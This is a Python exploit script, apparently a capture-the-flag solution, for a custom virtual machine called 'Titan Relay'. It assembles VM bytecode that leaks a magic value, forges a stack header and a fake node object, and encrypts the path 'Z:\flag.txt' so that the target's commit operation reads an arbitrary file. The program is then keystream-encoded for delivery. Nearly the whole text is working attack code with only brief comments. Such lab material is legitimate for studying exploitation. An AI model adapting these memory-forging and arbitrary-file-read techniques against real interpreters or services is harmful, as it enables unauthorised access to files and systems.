import struct,sys
# VM assembler for Titan Relay. Decoded opcodes executed by VM.
def imm32(r,v):   return bytes([0x11,r])+struct.pack('<I',v&0xffffffff)
def imm16(r,v):   return bytes([0xa3,r])+struct.pack('<H',v&0xffff)   # sign-extended
def movr(d,s):    return bytes([0xb1,d,s])
def xorr(d,s):    return bytes([0x42,d,s])
def orr(d,s):     return bytes([0x91,d,s])
def addr(d,s):    return bytes([0xa4,d,s])
def addi(d,i):    return bytes([0xa1,d,i&0xff])          # add imm8
def shl(d,i):     return bytes([0x81,d,i])
def shr(d,i):     return bytes([0x82,d,i])
def load_special(d,sreg,idx): return bytes([0x71,d,sreg,idx])  # if R[sreg]==&S: R[d]=S[idx]
def load_slot(d,idx): return bytes([0x21,d])+struct.pack('<h',idx)  # R[d]=state[0x58+idx*8]
def store(sreg,idx,sub): return bytes([0x32,sreg])+struct.pack('<h',idx)+bytes([sub]) # DWORD[0x58+idx*8+sub*4]=R[sreg].lo32
def commit(): return bytes([0x51])

PATH=b"Z:\\flag.txt"   # 11 bytes -> wine Z:\ == unix /
assert len(PATH)==11
pdw=[struct.unpack('<I',PATH[0:4])[0],
     struct.unpack('<I',PATH[4:8])[0],
     struct.unpack('<I',PATH[8:11]+b'\x00')[0]]

prog=b''
# R0 = &S  (op21 idx0 = state[0x58] = &S0)
prog+=load_slot(0,0)
# R1 = magic_lo32 ; R2 = magic_hi32   (gated load, gate reg=R0==&S)
prog+=load_special(1,0,0)
prog+=load_special(2,0,1)

# --- forge rbp header for op51 ---
# [rbp+0x08] = magic  (idx=-10)
prog+=store(1,-10,0)   # low
prog+=store(2,-10,1)   # high
# [rbp+0x10] = 0x1400018c0 (idx=-9)
prog+=imm32(3,0x400018c0); prog+=store(3,-9,0)
prog+=imm32(4,0x00000001); prog+=store(4,-9,1)

# --- write ciphertext (path^magic) at idx4,5 => rbp+0x78.. ---
prog+=imm32(3,pdw[0]); prog+=xorr(3,1); prog+=store(3,4,0)   # ct_dw0 ^ magic_lo
prog+=imm32(3,pdw[1]); prog+=xorr(3,2); prog+=store(3,4,1)   # ct_dw1 ^ magic_hi
prog+=imm32(3,pdw[2]); prog+=xorr(3,1); prog+=store(3,5,0)   # ct_dw2 ^ magic_lo

# --- write fake node at idx8..11 => rbp+0x98.. ---
# obj+0 = magic
prog+=store(1,8,0); prog+=store(2,8,1)
# obj+8 = ct_ptr = &S - 0xd8 + 0x78 = R0 - 0x60
prog+=movr(3,0); prog+=imm16(5,0xFFA0); prog+=addr(3,5)      # R3 = R0 - 0x60
prog+=store(3,9,0)                                           # ct_ptr low
prog+=movr(5,3); prog+=shr(5,32); prog+=store(5,9,1)         # ct_ptr high
# obj+0x10 = r9d = magic_hi ^ magic_lo
prog+=movr(5,2); prog+=xorr(5,1); prog+=store(5,10,0)
# obj+0x14 = 0xb
prog+=imm32(3,0xb); prog+=store(3,10,1)
# obj+0x18 = r10d = r9d + magic_lo
prog+=addr(5,1); prog+=store(5,11,0)

# --- R6 = obj = &S - 0xd8 + 0x98 = R0 - 0x40 ---
prog+=movr(6,0); prog+=imm16(7,0xFFC0); prog+=addr(6,7)

# commit
prog+=commit()

# encode with keystream k_i = (0x3d*i + 0x71) & 0xff
enc=bytes(((b ^ ((0x3d*i+0x71)&0xff)) & 0xff) for i,b in enumerate(prog))
print(len(enc))
print(enc.hex())
